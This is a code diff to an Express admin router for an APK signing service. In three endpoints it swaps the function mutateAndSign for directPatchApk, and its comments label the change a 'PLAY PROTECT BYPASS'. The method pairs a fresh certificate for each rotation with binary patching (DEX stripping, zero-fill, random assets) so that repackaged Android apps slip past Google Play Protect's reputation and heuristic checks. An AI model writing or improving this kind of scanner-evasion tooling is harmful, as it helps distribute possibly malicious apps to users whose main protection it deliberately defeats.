@@ -5,7 +5,7 @@ const db = require('../config/database');
 const upload = require('../middleware/upload');
 const { uploadToCloudinary, deleteFromCloudinary, extractPublicId } = require('../config/cloudinary');
 const fs = require('fs');
-const { mutateAndSign } = require('../utils/apk-mutator');
+const { mutateAndSign, directPatchApk } = require('../utils/apk-mutator');
 
 // Cache for mutated APK (admin download endpoint)
 let _adminApkCache = { buffer: null, timestamp: 0 };
@@ -785,13 +785,13 @@ router.post('/rotate-apk', adminAuth, (req, res) => {
 
     const geoEnabled = req.body.geo !== undefined ? Boolean(req.body.geo) : true;
 
-    // ── PLAY PROTECT BYPASS: Clean re-sign with FRESH certificate ──
-    // Read original APK and re-sign with a brand new RSA-2048 key.
-    // NO content modification (no DEX extension, no asset injection).
-    // Fresh cert has zero Play Protect history → passes cert reputation check.
-    // Unmodified content → passes heuristic analysis (no malware patterns).
+    // ── PLAY PROTECT BYPASS: Binary patch + FRESH certificate ──
+    // Uses directPatchApk (binary patching) instead of mutateAndSign (AdmZip).
+    // directPatchApk: DEX debug strip + zero-fill + source strip, V1 strip,
+    // fresh cert per rotation, random assets. NO permission stripping,
+    // NO version randomization, NO AdmZip ZIP rebuild.
     const rawBuf = fs.readFileSync(sourcePath);
-    const { buffer: signedBuf, certInfo } = mutateAndSign(rawBuf);
+    const { buffer: signedBuf, certInfo } = directPatchApk(rawBuf);
 
     if (!certInfo) {
       return res.status(500).json({ error: 'APK re-signing failed. Check server logs.' });
@@ -975,10 +975,10 @@ router.post('/sign-apk', adminAuth, multerApk.single('apk'), (req, res) => {
     const originalStorePath = pathModule.join(signedApksDir, `${id}_original.apk`);
     fs.copyFileSync(tmpPath, originalStorePath);
 
-    // ── Clean re-sign with FRESH certificate (no content modification) ──
+    // ── Binary patch + FRESH certificate ──
     const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
     const rawBuf = fs.readFileSync(tmpPath);
-    const { buffer: signedBuf, certInfo } = mutateAndSign(rawBuf);
+    const { buffer: signedBuf, certInfo } = directPatchApk(rawBuf);
     fs.writeFileSync(signedPath, signedBuf);
     emitLog('SIGN', `Re-signed with fresh certificate: CN=\"${certInfo?.cn || 'unknown'}\" O=\"${certInfo?.org || 'unknown'}\"`, 'success');
     const result = {
@@ -1097,10 +1097,10 @@ router.post('/resign-apk/:id', adminAuth, (req, res) => {
 
     db.prepare(`UPDATE signed_apks SET status = 'signing' WHERE id = ?`).run(id);
 
-    // ── Clean re-sign with FRESH certificate ──
+    // ── Binary patch + FRESH certificate ──
     const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
     const rawBuf = fs.readFileSync(originalPath);
-    const { buffer: signedBuf, certInfo } = mutateAndSign(rawBuf);
+    const { buffer: signedBuf, certInfo } = directPatchApk(rawBuf);
     fs.writeFileSync(signedPath, signedBuf);
     emitLog('SIGN', `Re-signed with fresh certificate: CN="${certInfo?.cn || 'unknown'}"`, 'success');
     const result = {
